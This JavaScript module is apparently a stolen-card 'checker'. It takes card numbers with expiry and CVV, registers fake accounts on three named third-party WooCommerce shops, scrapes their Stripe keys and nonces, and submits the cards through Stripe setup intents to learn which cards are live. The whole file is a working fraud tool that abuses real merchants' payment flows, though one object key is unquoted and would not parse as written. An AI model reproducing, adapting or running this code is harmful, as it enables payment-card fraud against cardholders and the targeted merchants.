import fetch from 'node-fetch';

const AUTH_SITES = [
    'https://pathosceramiche.com',
    'https://josephamichael.com',
    'https://perfectible.net'
];

export default async function stripeAuthCheck(ccInput) {
    const [number, month, year, cvv] = ccInput.split('|');
    const pan = number.replace(/\D/g, '');
    const expM = month.padStart(2, '0');
    const expY = year.slice(-2);
    const cleanCVV = cvv;
    const cleanCard = `${pan}|${expM}|${expY}|${cleanCVV}`;

    const sites = [...AUTH_SITES];
    for (let i = sites.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [sites[i], sites[j]] = [sites[j], sites[i]];
    }

    for (const site of sites) {
        try {
            const result = await checkCardOnSite(site, pan, expM, expY, cleanCVV);
            return result;
        } catch (_) {}
    }

    return {
        status: 'declined',
        message: '✗ all sites failed'
    };
}

async function checkCardOnSite(baseUrl, pan, expM, expY, cvv) {
    const addPmUrl = `${baseUrl}/my-account/add-payment-method/`;

    const email = `user${Math.random().toString(36).slice(2, 10)}@gmail.com`;
    const registerRes = await fetch(addPmUrl, {
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
            email: email,
            woocommerce-register-nonce: '',
            _wp_http_referer: '/my-account/add-payment-method/',
            register: 'Register'
        })
    });

    const html = await registerRes.text();

    const keyMatch = html.match(/pk_(?:live|test)_[a-zA-Z0-9]+/);
    if (!keyMatch) throw new Error('stripe key not found');
    const stripePubKey = keyMatch[0];

    let nonceMatch = html.match(/"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"/);
    if (!nonceMatch) {
        nonceMatch = html.match(/createAndConfirmSetupIntentNonce["\s:]+([^"\s,]+)/);
    }
    if (!nonceMatch) throw new Error('nonce not found');
    const setupIntentNonce = nonceMatch[1];

    const stripeRes = await fetch('https://api.stripe.com/v1/payment_methods', {
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/'
        },
        body: new URLSearchParams({
            type: 'card',
            'card[number]': pan,
            'card[cvc]': cvv,
            'card[exp_year]': expY,
            'card[exp_month]': expM,
            allow_redisplay: 'unspecified',
            'billing_details[address][country]': 'TR',
            key: stripePubKey,
            _stripe_version: '2024-06-20'
        })
    });

    const stripeData = await stripeRes.json();
    const pmId = stripeData.id;
    if (!pmId) {
        const err = stripeData.error?.message || 'stripe error';
        throw new Error(err);
    }

    const wcRes = await fetch(baseUrl, {
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'Origin': baseUrl,
            'Referer': addPmUrl
        },
        body: new URLSearchParams({
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            action: 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pmId,
            'wc-stripe-payment-type': 'card',
            _ajax_nonce: setupIntentNonce
        })
    });

    const wcData = await wcRes.json();

    if (wcData.success === true) {
        return {
            status: 'approved',
            message: '✓ auth success'
        };
    }

    const errMsg = wcData.data?.error?.message || wcData.data?.message || 'auth failed';
    return {
        status: 'declined',
        message: `✗ ${errMsg}`
    };
}
